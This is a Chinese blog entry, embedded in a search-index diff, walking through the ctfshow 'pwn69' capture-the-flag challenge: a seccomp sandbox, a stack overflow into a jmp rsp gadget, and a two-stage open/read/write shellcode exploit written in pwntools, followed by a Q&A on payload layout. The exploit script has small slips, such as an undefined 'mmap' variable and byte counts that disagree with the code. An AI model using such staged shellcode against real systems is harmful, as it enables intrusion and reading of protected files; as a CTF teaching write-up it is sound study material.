@@ -286,4 +286,176 @@
         <tag>流量分析</tag>
       </tags>
   </entry>
+  <entry>
+    <title>ctfshow pwn入门 pwn69</title>
+    <url>/2025/11/21/ctfshow-pwn%E5%85%A5%E9%97%A8-pwn69/</url>
+    <content><![CDATA[<h2 id="pwn69"><a href="#pwn69" class="headerlink" title="pwn69"></a>pwn69</h2><p><a href="https://ctf.show/challenges#pwn69-4079">ctf.show pwn69</a></p>
+<span id="more"></span>
+
+<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul>
+<li><a href="#jump1">题目</a></li>
+<li><a href="#jump2">预计时间</a></li>
+<li><a href="#jump3">题目分析及截图</a></li>
+</ul>
+<hr>
+<h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a><a id="jump1">题目</a></h4><img src="/2025/11/21/ctfshow-pwn%E5%85%A5%E9%97%A8-pwn69/1.png" class="" title="This is an image">
+
+<h4 id="预计时间"><a href="#预计时间" class="headerlink" title="预计时间"></a><a id="jump2">预计时间</a></h4><p>6h</p>
+<h4 id="题目分析及截图"><a href="#题目分析及截图" class="headerlink" title="题目分析及截图"></a><a id="jump3">题目分析及截图</a></h4><p><strong><code>ORW</code>是什么</strong></p>
+<blockquote>
+<p>​    当题目不允许直接执行&#x2F;bin&#x2F;sh(例如进制<code>execve</code>，过滤ROP，沙箱只允许有限syscall)，但是你仍然需要读取服务器上的某个Flag文件，就必须靠syscall来完成</p>
+</blockquote>
+<ol>
+<li><p><strong>open(“flag”, O_RDONLY)</strong></p>
+<p>打开flag文件，获得文件描述符</p>
+</li>
+<li><p><strong>read(fd,buf,size)</strong></p>
+<p>读取flag内容到缓冲区</p>
+</li>
+<li><p><strong>wirte(1,buf,size)</strong></p>
+<p>输出到标准输出</p>
+</li>
+</ol>
+<p><strong>什么是沙箱？</strong></p>
+<blockquote>
+<p>​    沙箱指一种”限制程序能力的隔离环境”，让程序即使被攻击，也只能做非常有限的事情，不能危害系统。简单说，就是限制程序，只能做白名单里的操作</p>
+</blockquote>
+<p>​      在pwn中最常见的就是 <strong>seccomp 沙箱</strong>  全称（<strong>Secure Computing Mode</strong>），它是Linux内核提供的一种”系统调用级别”的安全机制，用来限制进程可以调用哪些syscall。</p>
+<p>​     我们可以使用工具 <strong>seccom-tools</strong> 来分析 <strong>seccomp沙箱</strong>，列出程序允许的系统调用</p>
+<p>安装的教程很多，我这里不再说了</p>
+<p>介绍一下使用方法:  <code>seccomp-tools dump ./pwn</code></p>
+<hr>
+<p>我们反编译看一下程序的代码</p>
+<ol>
+<li><strong>main函数</strong></li>
+</ol>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  mmap((<span class="type">void</span> *)<span class="number">0x123000</span>, <span class="number">0x1000u</span>LL, <span class="number">6</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  sub_400949();</span><br><span class="line">  sub_400906();</span><br><span class="line">  sub_400A16();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li><strong>sub_400949()</strong> 函数</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_400949</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = seccomp_init(<span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112LL</span>, <span class="number">1LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112LL</span>, <span class="number">2LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v1, <span class="number">2147418112LL</span>, <span class="number">60LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> seccomp_load(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>**sub_400A16()**函数</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_400A16</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now you can use ORW to do&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x38u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;No you don&#x27;t understand I say!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>**sub_4009EE()**函数</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sub_4009EE</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __asm &#123; jmp     rsp &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<ol>
+<li>在函数<code>main</code>中</li>
+</ol>
+<p>​     <code>mmap((void *)0x123000, 0x1000uLL, 6, 34, -1, 0LL);</code>这个函数的作用就是从 0x123000 这个地址开始的 0x1000个字节，给它 <strong>写和执行</strong>的权限。</p>
+<p>​      mmap这里的<strong>4代表执行，2代表写，1代表读</strong>。这里4就是可执行，2就是可写（4+2&#x3D;6）</p>
+<ol start="2">
+<li>在函数<code>sub_400A16()</code>中</li>
+</ol>
+<p>​       <code>char buf[32]</code>定义了一个0x20字节的缓冲区buf</p>
+<p>​       <code>read(0, buf, 0x38uLL)</code> 这里是很有可能发生栈溢出的，因为我们定义的buf的缓冲区空间只有0x20字节，但是这里</p>
+<p>我们可以读入0x38字节字符，是很危险的。<strong>但是我们就是通过这里的栈溢出去进行攻击的</strong></p>
+<ol start="3">
+<li><p>在函数<code>sub_400949()</code>中</p>
+<p>  我们可以看到 <strong>seccomp</strong> 这可以说是沙箱的标志</p>
+<p>  我们使用<strong>seccomp-tools</strong>工具来查看我们执行的系统调用有哪些。</p>
+</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yyh@yyh:~/pwn69$ seccomp-tools dump ./pwn</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = <span class="built_in">arch</span></span><br><span class="line"> 0001: 0x15 0x00 0x08 0xc000003e  <span class="keyword">if</span> (A != ARCH_X86_64) goto 0010</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  <span class="keyword">if</span> (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x05 0xffffffff  <span class="keyword">if</span> (A != 0xffffffff) goto 0010</span><br><span class="line"> 0005: 0x15 0x03 0x00 0x00000000  <span class="keyword">if</span> (A == <span class="built_in">read</span>) goto 0009</span><br><span class="line"> 0006: 0x15 0x02 0x00 0x00000001  <span class="keyword">if</span> (A == write) goto 0009</span><br><span class="line"> 0007: 0x15 0x01 0x00 0x00000002  <span class="keyword">if</span> (A == open) goto 0009</span><br><span class="line"> 0008: 0x15 0x00 0x01 0x0000003c  <span class="keyword">if</span> (A != <span class="built_in">exit</span>) goto 0010</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以看到程序可以调用 open,read,write函数</p>
+<p><strong>所以我们可以利用栈溢出进行ORW来攻击</strong></p>
+<blockquote>
+<p>exp如下</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28131</span>)</span><br><span class="line"></span><br><span class="line">addr_mmap = <span class="number">0x123000</span></span><br><span class="line">jmp_rsp = <span class="number">0x400A01</span></span><br><span class="line"><span class="comment">#orw</span></span><br><span class="line">orw_shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;/ctfshow_flag&quot;</span>)</span><br><span class="line">orw_shellcode += shellcraft.read(<span class="number">3</span>,mmap,<span class="number">100</span>)</span><br><span class="line">orw_shellcode += shellcraft.write(<span class="number">1</span>,mmap,<span class="number">100</span>)</span><br><span class="line">shellcode = asm(orw_shellcode)</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload</span></span><br><span class="line">payload = asm(shellcraft.read(<span class="number">0</span>,mmap,<span class="number">100</span>))</span><br><span class="line">payload += asm(<span class="string">&quot;mov rax,0x123000;jmp rax&quot;</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(jmp_rsp) + asm(<span class="string">&quot;sub rsp,0x30;jmp rsp&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;do&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>我感觉这个payload挺难理解的。我讲一下我疑惑的点</p>
+<ol>
+<li><p><strong>Q</strong>：在<code>payload = asm(shellcraft.read(0,mmap,100))</code>它的意思是什么，我们往mmap中读入的是什么？</p>
+<p><strong>A</strong>：这句的意思是：从标准输入中读取256字节数据到mmap地址，而我们往mmap读入的是：第二次发送的 <strong>ORW shellcode</strong>  </p>
+</li>
+<li><p><strong>Q</strong>：<code>payload = asm(shellcraft.read(0,mmap,100)) payload += asm(&quot;mov rax,0x123000;jmp rax&quot;)</code>实现了什么功能?</p>
+<p><strong>A</strong>：<strong>一句话总结 从标准输入(文件描述符0)读取0x100字节数据，<br>写入到内存地址0x123000(mmap)</strong></p>
+</li>
+<li><p><strong>Q</strong>：<code>payload = payload.ljust(0x28, b&#39;a&#39;)</code>这里的<code>=</code>换成<code>+=</code>有什么影响？为什么我前面已经填充了很多字节的shellcode了但是还是需要填充缓冲区0x28字节，他不会造成溢出吗？而且返回地址这些偏移也会不准确？</p>
+<p><strong>A</strong>：这两个写法的关键区别在于<code>ljust</code>的对象不同，导致最终<code>payload</code>的布局完全不一样。</p>
+<ul>
+<li><p>首先 <strong>第一种</strong> 写法</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = asm(shellcraft.read(<span class="number">0</span>,mmap,<span class="number">100</span>))</span><br><span class="line">payload += asm(<span class="string">&quot;mov rax,0x123000;jmp rax&quot;</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(jmp_rsp) + asm(<span class="string">&quot;sub rsp,0x30;jmp rsp&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这种写法是正确的，它是对整个payload进行ljust到0x28，并不是追加0x28字节的a,而是加以来（连带payload）一共是0x28字节，即确保我覆盖到栈上返回地址之前的位置</p>
+</li>
+<li><p><strong>第二种</strong>写法</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = asm(shellcraft.read(<span class="number">0</span>,mmap,<span class="number">100</span>))</span><br><span class="line">payload += asm(<span class="string">&quot;mov rax,0x123000;jmp rax&quot;</span>)</span><br><span class="line">payload += payload.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(jmp_rsp) + asm(<span class="string">&quot;sub rsp,0x30;jmp rsp&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这种写法是将 <strong>0x28字节a</strong> 再次追加到原payload后面。</p>
+<p>这会导致：</p>
+<ol>
+<li><p>长度完全错了</p>
+</li>
+<li><p>栈偏移完全不对</p>
+<pre><code>     3. 覆盖不到正确的RIP
+     4. 触发不了ROP
+</code></pre>
+</li>
+</ol>
+<p>这不是我们想要的结果，是逻辑错误</p>
+<p><strong>这个问题困扰了我好长时间，如果你也不太理解，建议可以问一下gpt，我是问了他才知道的，ds感觉说的不太准确</strong></p>
+</li>
+</ul>
+</li>
+<li><p><strong>Q</strong>：<code>payload += p64(jmp_rsp) + asm(&quot;sub rsp,0x30;jmp rsp&quot;)</code>实现了什么功能？这里为什么是0x30?</p>
+<p><strong>A</strong>：首先这个<code>jmp_rsp</code>是我们的返回地址。我们为什么要返回栈顶，其实不难理解。<br>我们在buf里输入我们的shellcode，返回栈顶就是去执行它嘛，然后跳转到mmap执行我们的ORW。<br>但是为什么要<code>sub rsp, 0x30</code>?这个30是哪里来的？</p>
+<p> <strong>当我们执行到jmp rsp时，rsp刚好指向save rbp后面的8字节</strong></p>
+<p>当ret跳到jmp rsp时：RSP指向的是save RIP后面的”下一段栈空间”，也就是payload中 0x28+8&#x3D;0x30</p>
+</li>
+<li><p><strong>Q</strong>：我们明明先发的shellcode就是</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = asm(shellcraft.read(<span class="number">0</span>,mmap,<span class="number">100</span>)) </span><br><span class="line">payload += asm(<span class="string">&quot;mov rax,0x123000;jmp rax&quot;</span>) </span><br></pre></td></tr></table></figure>
+
+<p>那么最后为什么我们还需要将rsp指向这里呢？我们不是已经执行过了吗？</p>
+<p><strong>A</strong>：因为它并不是自动执行的，它只是放到了栈上还没有执行。我们必须使用 **ROP gadget（jmp rsp）**才能让CPU去自动执行。</p>
+<p>如果没有 jmp rsp：</p>
+<ul>
+<li>程序不会跳到你写入栈上的shellcode</li>
+<li>程序只会 ret 回原本的函数-&gt;导致程序崩溃</li>
+<li>我的shellcode不会执行</li>
+</ul>
+<p><strong>简单两句话解释</strong> ：</p>
+<ul>
+<li><p><strong>stage1 shellcode（read + jmp mmap）只是你写在栈里的内容，不会自动运行。</strong></p>
+</li>
+<li><p><strong>ret → jmp_rsp → jmp rsp 才能把执行流跳到栈上的 shellcode。</strong></p>
+</li>
+</ul>
+</li>
+<li><p><strong>Q</strong>：在 <strong>ORW_shellcode</strong> 中 <code>shellcraft.read(3,mmap,100)</code>，这里面的3是什么？我们往mmap中读入的是什么？</p>
+<p><strong>A</strong>：</p>
+<ul>
+<li><p>这个<code>3</code>是文件描述符fd，为什么是3?</p>
+<p>fd &#x3D; 0（stdin）</p>
+<p>fd &#x3D; 1（stdout）</p>
+<p>fd &#x3D; 2（stderr）</p>
+<p>所以第一个可用的文件描述符fd通常是3</p>
+</li>
+<li><p>那么我们往mmap中读入的是什么？</p>
+<p>因为第一步是open &#x2F;ctfshow——flag，所以这里我们是读入文件最多100字节</p>
+</li>
+</ul>
+</li>
+<li><p><strong>Q</strong>： <code>write(1,mmap,100)</code> 实现什么功能？</p>
+<p><strong>A</strong>：写到 stdout ，让我看见flag</p>
+</li>
+</ol>
+<p>​	其实到这里已经很清楚了，用我的大白话来说，本道题的思路就是在buf缓冲区中注入shellcode，这个shellcode的作用就是读取ORW_shellcode到mmap（因为buf的缓冲区太小了不足以放下ORW_shellcode），接着跳转到这里。然后我们填满栈偏移直至0x28字节，使用rsp执行我们的shellcode跳转到mmap，执行ORW shellcode 获得flag</p>
+<p>​	这道题我认为比较有难度，但是虽然这道题很难，但你已经走得很远了，坚持一下，肯定能攻克它！</p>
+<p>​	希望可以帮到你，加油！</p>
+]]></content>
+      <tags>
+        <tag>— CTF - pwn - 网络安全</tag>
+      </tags>
+  </entry>
 </search>
